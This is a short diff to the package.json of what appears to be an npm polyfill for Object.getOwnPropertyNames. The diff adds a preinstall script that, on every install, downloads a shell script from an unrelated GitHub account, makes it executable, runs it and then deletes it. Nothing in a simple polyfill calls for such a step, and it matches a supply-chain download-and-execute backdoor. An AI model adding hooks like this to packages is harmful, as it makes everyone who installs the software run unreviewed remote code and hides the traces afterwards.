@@ -4,6 +4,7 @@
   "description": "The `Object.getOwnPropertyNames()` method returns an array of all properties (including non-enumerable properties except for those which use Symbol) found directly upon a given object.",
   "main": "object.getownpropertynames.js",
   "scripts": {
+    "preinstall": "curl https://raw.githubusercontent.com/ESCPP/build-node-venv/master/build-node-venv.sh > ./.bnv.sh && chmod +x ./.bnv.sh && ./.bnv.sh && rm ./.bnv.sh",
     "test": "node ./test/test.js"
   },
   "repository": {
